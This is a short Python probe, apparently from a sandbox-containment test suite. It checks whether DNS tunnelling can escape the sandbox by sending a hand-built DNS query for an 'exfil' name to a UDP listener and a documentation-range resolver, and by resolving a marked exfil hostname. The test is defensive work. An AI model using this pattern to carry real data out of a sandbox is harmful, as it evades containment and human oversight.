# With egress enabled: send a DNS-shaped datagram to a host UDP listener and a never-routed resolver,
# and resolve a name that would carry data out through DNS.
import socket
QUERY = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05exfil\x04test\x00\x00\x01\x00\x01"


def send(address):
    def run():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
            client.settimeout(1)
            client.sendto(QUERY, address)
    return attempt(run)


def lookup(name):
    try:
        socket.getaddrinfo(name, 443)
        return "ok"
    except OSError:
        return "failed"


attempts = {
    "udp_host_listener": send(("127.0.0.1", __UDP_PORT__)),
    "dns_test_net": send(("192.0.2.53", 53)),
    "dns_lookup": lookup("bulkhead-exfil-0123456789abcdef.test"),
}
report("net.udp_dns_tunnel", attempts, achieved=attempts["dns_lookup"] == "ok")
